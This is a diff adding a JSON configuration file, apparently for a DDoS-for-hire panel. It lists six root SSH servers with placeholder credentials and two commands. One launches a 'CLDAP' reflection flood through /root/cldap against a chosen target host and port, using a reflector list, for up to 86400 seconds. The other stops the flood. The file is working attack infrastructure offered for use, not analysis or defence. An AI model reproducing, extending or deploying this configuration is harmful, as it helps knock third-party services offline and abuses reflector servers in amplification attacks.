@@ -1,0 +1,60 @@
+{
+    "methods": [
+        {
+            "name": "stop",
+            "command": "pkill {host} -f",
+            "servers": ["alpha", "bravo", "charlie", "delta", "echo", "foxtrot"]
+        },  
+        {
+            "name": "CLDAP",
+            "command": "screen -dmS {host} /root/cldap {host} {port} /root/cldap.txt 2 -1 {time}",
+            "servers": ["alpha", "bravo", "charlie", "delta", "echo", "foxtrot"]
+        }
+
+    ],
+    "max_time": 86400,
+    "servers": [{
+            "name": "alpha",
+            "host": "server_ip",
+            "port": 22,
+            "user": "root",
+            "password": "server_password"
+        },
+        {
+            "name": "bravo",
+            "host": "server_ip",
+            "port": 22,
+            "user": "root",
+            "password": "server_password"
+        },
+        {
+            "name": "charlie",
+            "host": "server_ip",
+            "port": 22,
+            "user": "root",
+            "password": "server_password"
+        },
+        {
+            "name": "delta",
+            "host": "server_ip",
+            "port": 22,
+            "user": "root",
+            "password": "server_password"
+        },
+        {
+            "name": "echo",
+            "host": "server_ip",
+            "port": 22,
+            "user": "root",
+            "password": "server_password"
+        },
+        {
+            "name": "foxtrot",
+            "host": "server_ip",
+            "port": 22,
+            "user": "root",
+            "password": "server_password"
+        }
+
+    ]
+}   
